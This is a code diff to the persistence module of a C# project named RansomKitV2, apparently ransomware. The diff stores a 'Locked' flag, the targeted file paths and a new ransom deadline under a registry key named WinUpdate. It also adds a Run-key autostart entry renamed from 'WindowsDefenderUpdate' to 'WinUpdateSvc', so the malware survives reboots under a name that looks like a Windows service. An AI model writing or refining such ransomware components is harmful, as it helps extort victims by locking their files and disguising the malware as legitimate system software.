@@ -1,53 +1,46 @@
 using System;
 using System.Collections.Generic;
 using System.Diagnostics;
-using System.IO;
-using System.Windows.Forms;
+using System.Reflection;
 using Microsoft.Win32;
 
 namespace RansomKitV2
 {
-    internal static class Persistence
+    public static class Persistence
     {
-        private const string StateKeyPath = @"Software\Microsoft\Windows\CurrentVersion\WinUpdate";
-        private const string RunKeyPath = @"Software\Microsoft\Windows\CurrentVersion\Run";
-        private const string RunValueName = "WindowsDefenderUpdate";
-        private const string LockedValue = "Locked";
-        private const string PathsValue = "Paths";
+        private const string RegBase = @"Software\Microsoft\Windows\CurrentVersion";
+        private const string CustomKeyPath = RegBase + @"\WinUpdate";
+        private const string RunKeyPath = RegBase + @"\Run";
 
-        public static void EnsureAutoStart()
+        private const string RunValueName = "WinUpdateSvc";
+        private const string LockedValueName = "Locked";
+        private const string PathsValueName = "Paths";
+        private const string DeadlineValueName = "DeadlineUtc";
+
+        // ---------------------------------------------------------
+        //  Key access
+        // ---------------------------------------------------------
+        private static RegistryKey? OpenCustom(bool writable)
         {
             try
             {
-                using var key = Registry.CurrentUser.CreateSubKey(RunKeyPath, true);
-                if (key == null) return;
-                string exe = Process.GetCurrentProcess().MainModule?.FileName
-                             ?? Application.ExecutablePath;
-                key.SetValue(RunValueName, $"\"{exe}\" --silent", RegistryValueKind.String);
+                return writable
+                    ? Registry.CurrentUser.CreateSubKey(CustomKeyPath, true)
+                    : Registry.CurrentUser.OpenSubKey(CustomKeyPath, false);
             }
-            catch { }
+            catch { return null; }
         }
 
-        public static void DisableAutoStart()
-        {
-            try
-            {
-                using var key = Registry.CurrentUser.OpenSubKey(RunKeyPath, true);
-                key?.DeleteValue(RunValueName, false);
-            }
-            catch { }
-        }
-
-        // Kept for compat with existing MainForm calls.
-        public static void Enable() => EnsureAutoStart();
-
+        // ---------------------------------------------------------
+        //  Lock state
+        // ---------------------------------------------------------
         public static bool IsLocked()
         {
             try
             {
-                using var key = Registry.CurrentUser.OpenSubKey(StateKeyPath, false);
-                var v = key?.GetValue(LockedValue);
-                return v is int i && i == 1;
+                using var k = OpenCustom(false);
+                var v = k?.GetValue(LockedValueName);
+                return v is int i && i != 0;
             }
             catch { return false; }
         }
@@ -56,43 +49,129 @@ namespace RansomKitV2
         {
             try
             {
-                using var key = Registry.CurrentUser.CreateSubKey(StateKeyPath, true);
-                key?.SetValue(LockedValue, locked ? 1 : 0, RegistryValueKind.DWord);
+                using var k = OpenCustom(true);
+                k?.SetValue(LockedValueName, locked ? 1 : 0, RegistryValueKind.DWord);
             }
             catch { }
         }
 
+        // ---------------------------------------------------------
+        //  Target paths (REG_MULTI_SZ)
+        // ---------------------------------------------------------
         public static void SavePaths(IEnumerable<string> paths)
         {
+            if (paths == null) return;
             try
             {
-                using var key = Registry.CurrentUser.CreateSubKey(StateKeyPath, true);
-                key?.SetValue(PathsValue, string.Join('|', paths), RegistryValueKind.String);
+                using var k = OpenCustom(true);
+                if (k == null) return;
+
+                var list = new List<string>();
+                foreach (var p in paths)
+                    if (!string.IsNullOrWhiteSpace(p))
+                        list.Add(p);
+
+                if (list.Count == 0)
+                    k.DeleteValue(PathsValueName, false);
+                else
+                    k.SetValue(PathsValueName, list.ToArray(), RegistryValueKind.MultiString);
             }
             catch { }
         }
 
         public static List<string> LoadPaths()
         {
-            var list = new List<string>();
+            var result = new List<string>();
             try
             {
-                using var key = Registry.CurrentUser.OpenSubKey(StateKeyPath, false);
-                var raw = key?.GetValue(PathsValue) as string;
-                if (string.IsNullOrEmpty(raw)) return list;
-                foreach (var p in raw.Split('|', StringSplitOptions.RemoveEmptyEntries))
-                    if (Directory.Exists(p) || File.Exists(p)) list.Add(p);
+                using var k = OpenCustom(false);
+                if (k == null) return result;
+
+                var raw = k.GetValue(PathsValueName) as string[];
+                if (raw == null) return result;
+
+                foreach (var p in raw)
+                    if (!string.IsNullOrWhiteSpace(p))
+                        result.Add(p);
             }
             catch { }
-            return list;
+            return result;
         }
 
         public static void ClearPaths()
         {
             try
             {
-                using var key = Registry.CurrentUser.OpenSubKey(StateKeyPath, true);
-                key?.DeleteValue(PathsValue, false);
+                using var k = OpenCustom(true);
+                try { k?.DeleteValue(PathsValueName, false); } catch { }
+            }
+            catch { }
+        }
+
+        // ---------------------------------------------------------
+        //  Deadline (UTC ticks, REG_QWORD)
+        // ---------------------------------------------------------
+        public static void SaveDeadline(DateTime utc)
+        {
+            try
+            {
+                using var k = OpenCustom(true);
+                k?.SetValue(DeadlineValueName, utc.Ticks, RegistryValueKind.QWord);
+            }
+            catch { }
+        }
+
+        public static DateTime? LoadDeadline()
+        {
+            try
+            {
+                using var k = OpenCustom(false);
+                var raw = k?.GetValue(DeadlineValueName);
+                if (raw is long ticks && ticks > 0)
+                    return new DateTime(ticks, DateTimeKind.Utc);
+            }
+            catch { }
+            return null;
+        }
+
+        public static void ClearDeadline()
+        {
+            try
+            {
+                using var k = OpenCustom(true);
+                try { k?.DeleteValue(DeadlineValueName, false); } catch { }
+            }
+            catch { }
+        }
+
+        // ---------------------------------------------------------
+        //  Auto-start (HKCU\...\Run)
+        // ---------------------------------------------------------
+        public static void EnsureAutoStart()
+        {
+            try
+            {
+                string exe = Process.GetCurrentProcess().MainModule?.FileName
+                             ?? Assembly.GetExecutingAssembly().Location;
+
+                using var k = Registry.CurrentUser.CreateSubKey(RunKeyPath, true);
+                if (k == null) return;
+
+                string desired = $"\"{exe}\" --silent";
+                var current = k.GetValue(RunValueName) as string;
+
+                if (!string.Equals(current, desired, StringComparison.OrdinalIgnoreCase))
+                    k.SetValue(RunValueName, desired, RegistryValueKind.String);
+            }
+            catch { }
+        }
+
+        public static void DisableAutoStart()
+        {
+            try
+            {
+                using var k = Registry.CurrentUser.OpenSubKey(RunKeyPath, true);
+                try { k?.DeleteValue(RunValueName, false); } catch { }
             }
             catch { }
         }
